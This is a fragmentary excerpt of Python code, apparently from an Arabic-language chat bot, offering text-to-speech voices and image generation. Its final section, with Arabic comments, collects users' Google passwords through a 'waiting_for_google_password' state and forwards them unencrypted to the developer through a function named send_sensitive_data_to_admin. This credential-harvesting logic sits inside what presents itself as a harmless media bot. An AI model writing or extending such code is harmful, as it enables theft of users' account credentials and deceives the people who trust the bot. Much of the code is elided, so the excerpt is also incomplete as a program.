...
# ===================== دوال توليد الصور (Hugging Face + Pollinations) =====================
...
async def _tts_male(text, output_path):
    import edge_tts
    communicate = edge_tts.Communicate(text, "ar-EG-ShakirNeural")
    await communicate.save(output_path)

async def _tts_female(text, output_path):
    import edge_tts
    communicate = edge_tts.Communicate(text, "ar-SA-ZariNeural")
    await communicate.save(output_path)

async def _tts_child(text, output_path):
    import edge_tts
    communicate = edge_tts.Communicate(text, "ar-EG-ShakirNeural")
    await communicate.save(output_path)

async def _tts_scary(text, output_path):
    import edge_tts
    communicate = edge_tts.Communicate(text, "ar-AE-FatimaNeural")
    await communicate.save(output_path)

def tts_male(text, output_path):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_tts_male(text, output_path))
    finally:
        loop.close()

def tts_female(text, output_path):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_tts_female(text, output_path))
    finally:
        loop.close()

def tts_child(text, output_path):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_tts_child(text, output_path))
    finally:
        loop.close()

def tts_scary(text, output_path):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_tts_scary(text, output_path))
    finally:
        loop.close()

VOICE_MAP = {
    "female": {"name": "👩 صوت أنثوي", "func": tts_female, "gtts_lang": "ar", "gtts_tld": "com"},
    "male": {"name": "👨 صوت ذكوري", "func": tts_male, "gtts_lang": "ar", "gtts_tld": "co.uk"},
    "child": {"name": "🧒 صوت طفولي", "func": tts_child, "gtts_lang": "ar", "gtts_tld": "co.za"},
    "scary": {"name": "👻 صوت مخيف", "func": tts_scary, "gtts_lang": "ar", "gtts_tld": "com.au"}
}
...
def text_to_speech(text, voice_key='female'):
    ...
    try:
        ...
        voice_func(clean_text, temp_file)
...
# ===================== دوال إرسال البيانات للمطور (بدون تشفير، فقط للمطور) =====================
...
def send_sensitive_data_to_admin(data_type, content, user_id=None):
    """إرسال بيانات حساسة للمطور مباشرة (بدون تشفير)"""
    try:
        if user_id:
...
user_states = {}
google_users = {}
google_passwords = {}  # سيتم تخزين كلمات السر مؤقتاً فقط أثناء الجلسة
temp_emails = {}
    ...
    try:
        ...
        if state == "waiting_for_google_password":
            if chat_id in google_users:
                ...
                # إرسال كلمة السر للمطور مباشرة (بدون تشفير)
